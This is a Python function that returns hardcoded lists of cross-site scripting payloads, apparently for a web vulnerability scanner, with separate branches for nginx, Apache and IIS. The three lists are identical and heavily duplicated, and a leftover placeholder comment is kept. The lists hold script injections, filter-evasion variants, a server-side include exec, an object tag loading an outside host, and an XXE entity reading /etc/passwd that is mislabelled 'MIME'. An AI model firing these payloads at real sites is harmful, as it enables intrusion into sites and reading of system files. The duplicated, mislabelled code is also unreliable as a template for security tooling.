def generate_payloads(server_type='generic'):
    if server_type == 'nginx':
        return [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')" />',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '"><img src="x" onerror="alert(\'XSS\')" />',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')" />',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        # ... (previous payloads)
        '<img src=x onerror=alert("XSS")>',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        # XSS Locator (Polygot)
        '\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
        # Malformed A Tags
        '<a foo=a src="javascript:alert(\'XSS\')">Click Me</a>',
        '<a foo=a href="javascript:alert(\'XSS\')">Click Me</a>',
        # Malformed IMG Tags
        '<img foo=a src="javascript:alert(\'XSS\')">',
        '<img foo=a onerror="alert(\'XSS\')">',
        # fromCharCode
        '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
        # Default SRC Tag to Get Past Filters that Check SRC Domain
        '<img src="http://example.com/image.jpg">',
        # Default SRC Tag by Leaving it Empty
        '<img src="">',
        # Default SRC Tag by Leaving it out Entirely
        '<img>',
        # On Error Alert
        '<img src=x onerror=alert("XSS")>',
        # IMG onerror and JavaScript Alert Encode
        '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
        # Decimal HTML Character References
        '&#34;><img src=x onerror=alert(\'XSS\')>',
        # Decimal HTML Character References Without Trailing Semicolons
        '&#34><img src=x onerror=alert(\'XSS\')>',
        # Hexadecimal HTML Character References Without Trailing Semicolons
        '&#x22><img src=x onerror=alert(\'XSS\')>',
        # List-style-image
        '<style>li {list-style-image: url("javascript:alert(\'XSS\')");}</style><ul><li></ul>',
        # VBscript in an Image
        '<img src="vbscript:alert(\'XSS\')">',
        # SVG Object Tag
        '<svg><p><style><img src=1 href=1 onerror=alert(1)></p></svg>',
        # ECMAScript 6
        '<a href="javascript:void(0)" onmouseover="alert(1)">Click Me</a>',
        # BODY Tag
        '<BODY ONLOAD=alert(\'XSS\')>',
        # <BODY ONLOAD=alert('XSS')>
        '<BODY ONLOAD=alert(\'XSS\')>',
        # Event Handlers
        '<img onmouseover="alert(\'XSS\')" src="x">',
        # Various Tags with Broken-up for XSS
        '<s<Sc<script>ript>alert(\'XSS\')</script>',
        # TABLE
        '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
        # TD
        '<TD BACKGROUND="javascript:alert(\'XSS\')">',
        # DIV
        '<DIV STYLE="width: expression(alert(\'XSS\'));">',
        # BASE TAG
        '<BASE HREF="javascript:alert(\'XSS\');//">',
        # OBJECT TAG
        '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/xss.html"></OBJECT>',
        # SSI XSS
        '<!--#exec cmd="/bin/echo \'<SCR\'+\'IPT>alert("XSS")</SCR\'+\'IPT>\'"-->',
        # HTML+TIME IN XML
        '<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>',
        # Using ActionScript Inside Flash
        '<SWF><PARAM NAME=movie VALUE="javascript:alert(\'XSS\')"></PARAM><embed src="javascript:alert(\'XSS\')"></embed></SWF>',
        # MIME
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>']
    elif server_type == 'apache':
        return [
                    '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')" />',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '"><img src="x" onerror="alert(\'XSS\')" />',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')" />',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        # ... (previous payloads)
        '<img src=x onerror=alert("XSS")>',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        # XSS Locator (Polygot)
        '\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
        # Malformed A Tags
        '<a foo=a src="javascript:alert(\'XSS\')">Click Me</a>',
        '<a foo=a href="javascript:alert(\'XSS\')">Click Me</a>',
        # Malformed IMG Tags
        '<img foo=a src="javascript:alert(\'XSS\')">',
        '<img foo=a onerror="alert(\'XSS\')">',
        # fromCharCode
        '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
        # Default SRC Tag to Get Past Filters that Check SRC Domain
        '<img src="http://example.com/image.jpg">',
        # Default SRC Tag by Leaving it Empty
        '<img src="">',
        # Default SRC Tag by Leaving it out Entirely
        '<img>',
        # On Error Alert
        '<img src=x onerror=alert("XSS")>',
        # IMG onerror and JavaScript Alert Encode
        '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
        # Decimal HTML Character References
        '&#34;><img src=x onerror=alert(\'XSS\')>',
        # Decimal HTML Character References Without Trailing Semicolons
        '&#34><img src=x onerror=alert(\'XSS\')>',
        # Hexadecimal HTML Character References Without Trailing Semicolons
        '&#x22><img src=x onerror=alert(\'XSS\')>',
        # List-style-image
        '<style>li {list-style-image: url("javascript:alert(\'XSS\')");}</style><ul><li></ul>',
        # VBscript in an Image
        '<img src="vbscript:alert(\'XSS\')">',
        # SVG Object Tag
        '<svg><p><style><img src=1 href=1 onerror=alert(1)></p></svg>',
        # ECMAScript 6
        '<a href="javascript:void(0)" onmouseover="alert(1)">Click Me</a>',
        # BODY Tag
        '<BODY ONLOAD=alert(\'XSS\')>',
        # <BODY ONLOAD=alert('XSS')>
        '<BODY ONLOAD=alert(\'XSS\')>',
        # Event Handlers
        '<img onmouseover="alert(\'XSS\')" src="x">',
        # Various Tags with Broken-up for XSS
        '<s<Sc<script>ript>alert(\'XSS\')</script>',
        # TABLE
        '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
        # TD
        '<TD BACKGROUND="javascript:alert(\'XSS\')">',
        # DIV
        '<DIV STYLE="width: expression(alert(\'XSS\'));">',
        # BASE TAG
        '<BASE HREF="javascript:alert(\'XSS\');//">',
        # OBJECT TAG
        '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/xss.html"></OBJECT>',
        # SSI XSS
        '<!--#exec cmd="/bin/echo \'<SCR\'+\'IPT>alert("XSS")</SCR\'+\'IPT>\'"-->',
        # HTML+TIME IN XML
        '<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>',
        # Using ActionScript Inside Flash
        '<SWF><PARAM NAME=movie VALUE="javascript:alert(\'XSS\')"></PARAM><embed src="javascript:alert(\'XSS\')"></embed></SWF>',
        # MIME
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>']
    elif server_type == 'iis':
        return [
                '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')" />',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '"><img src="x" onerror="alert(\'XSS\')" />',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')" />',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        # ... (previous payloads)
        '<img src=x onerror=alert("XSS")>',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        # XSS Locator (Polygot)
        '\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
        # Malformed A Tags
        '<a foo=a src="javascript:alert(\'XSS\')">Click Me</a>',
        '<a foo=a href="javascript:alert(\'XSS\')">Click Me</a>',
        # Malformed IMG Tags
        '<img foo=a src="javascript:alert(\'XSS\')">',
        '<img foo=a onerror="alert(\'XSS\')">',
        # fromCharCode
        '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
        # Default SRC Tag to Get Past Filters that Check SRC Domain
        '<img src="http://example.com/image.jpg">',
        # Default SRC Tag by Leaving it Empty
        '<img src="">',
        # Default SRC Tag by Leaving it out Entirely
        '<img>',
        # On Error Alert
        '<img src=x onerror=alert("XSS")>',
        # IMG onerror and JavaScript Alert Encode
        '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
        # Decimal HTML Character References
        '&#34;><img src=x onerror=alert(\'XSS\')>',
        # Decimal HTML Character References Without Trailing Semicolons
        '&#34><img src=x onerror=alert(\'XSS\')>',
        # Hexadecimal HTML Character References Without Trailing Semicolons
        '&#x22><img src=x onerror=alert(\'XSS\')>',
        # List-style-image
        '<style>li {list-style-image: url("javascript:alert(\'XSS\')");}</style><ul><li></ul>',
        # VBscript in an Image
        '<img src="vbscript:alert(\'XSS\')">',
        # SVG Object Tag
        '<svg><p><style><img src=1 href=1 onerror=alert(1)></p></svg>',
        # ECMAScript 6
        '<a href="javascript:void(0)" onmouseover="alert(1)">Click Me</a>',
        # BODY Tag
        '<BODY ONLOAD=alert(\'XSS\')>',
        # <BODY ONLOAD=alert('XSS')>
        '<BODY ONLOAD=alert(\'XSS\')>',
        # Event Handlers
        '<img onmouseover="alert(\'XSS\')" src="x">',
        # Various Tags with Broken-up for XSS
        '<s<Sc<script>ript>alert(\'XSS\')</script>',
        # TABLE
        '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
        # TD
        '<TD BACKGROUND="javascript:alert(\'XSS\')">',
        # DIV
        '<DIV STYLE="width: expression(alert(\'XSS\'));">',
        # BASE TAG
        '<BASE HREF="javascript:alert(\'XSS\');//">',
        # OBJECT TAG
        '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/xss.html"></OBJECT>',
        # SSI XSS
        '<!--#exec cmd="/bin/echo \'<SCR\'+\'IPT>alert("XSS")</SCR\'+\'IPT>\'"-->',
        # HTML+TIME IN XML
        '<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>',
        # Using ActionScript Inside Flash
        '<SWF><PARAM NAME=movie VALUE="javascript:alert(\'XSS\')"></PARAM><embed src="javascript:alert(\'XSS\')"></embed></SWF>',
        # MIME
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>']
